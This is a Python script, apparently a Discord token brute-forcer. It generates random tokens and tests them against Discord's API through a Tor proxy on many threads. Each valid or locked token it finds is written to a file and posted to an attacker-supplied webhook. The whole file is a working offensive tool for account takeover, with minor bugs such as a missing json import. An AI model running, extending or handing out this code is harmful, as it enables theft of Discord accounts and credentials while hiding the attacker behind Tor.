import random
import string
import pathlib
import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path
import colorama
from colorama import Fore, init, Back, Style
from datetime import date
import requests
import random
from threading import active_count, Thread
from itertools import count, cycle, repeat
from colorama import Fore as f
from pystyle import Colorate, Colors, Write
import os

count = 0
hook = "Your Webhook Here"

def brute():
    token = "XXXXXXXXXXXXXXXXXXXXXXXX.XXXXXX"+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    headers = {
	       'Authorization': f'{token}'  
    }
#    src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
    response = requests.post(f'https://discord.com/api/v9/invite/miaou', headers={'Authorization': token}, proxies=dict(http="socks5://127.0.0.1:9050", https="socks5://127.0.0.1:9050"))
    if response.status_code == 401:
        print(f'{Fore.LIGHTMAGENTA_EX}Invalid token! >{Fore.RESET} ' + token)
    elif "You need to verify your account in order to perform this action." in str(response.content):
        print(f'{Fore.LIGHTBLUE_EX}valid(Locked) token! >{Fore.RESET} ' + token)
        f = open('Locked.txt', 'a', encoding='UTF-8')
        f.write(f'{token}\n')
        f.close()
        requests.post(hook, headers= {"content-type": "application/json"}, data= json.dumps({'content': f'@everyone Found a Token!! \n{token}'}), proxies=dict(http="socks5://127.0.0.1:9050", https="socks5://127.0.0.1:9050"), timeout= 3500)
    elif response.status_code in (200, 201, 204, 302):
        print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
        f = open('成功.txt', 'a', encoding='UTF-8')
        f.write(f'{token}\n')
        f.close()
        requests.post(hook, headers= {"content-type": "application/json"}, data= json.dumps({'content': f'@everyone Found a Token!! \n{token}'}), proxies=dict(http="socks5://127.0.0.1:9050", https="socks5://127.0.0.1:9050"), timeout= 3500)
#    if src.status_code in (200, 201, 204, 302):
#        print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
#        f = open('成功.txt', 'a', encoding='UTF-8')
#        f.write(f'{token}\n')
#        f.close()
#    elif src.status_code == 403:
#        print(f'{Fore.LIGHTGREEN_EX}Valid token! >{Fore.RESET} ' + token)
#        f = open('成功.txt', 'a', encoding='UTF-8')
#        f.write(f'{token}\n')
#        f.close()    
#    elif src.status_code == 429:
    elif response.status_code == 429:
         print("RateLimited!!")
#         time.sleep(900)
    else:
#        if src.status_code != 404:
        if response.status_code != 404:
             print("Something wrong\nStop Program.")
#             print(src.status_code)
             print(response.status_code)
             os._exit(1)
        else:
            print(f'{Fore.LIGHTRED_EX}Invalid token >{Fore.RESET} ' + token)
#            print(src.status_code)
#            print(response.status_code)

if __name__ == "__main__":
    NThread = Write.Input("何threadにする?  -> ", Colors.red_to_purple, interval=0.0001)
#もう気にしなくていいよ	
    while True:
        Run = True
        while Run:
            if active_count() <= int(NThread):
                try:
                    Thread(target=brute).start()
                except:
                    pass
    else:
            if active_count() <= int(NThread):
                try:
                    Thread(target=brute).start()
                except:
                    pass
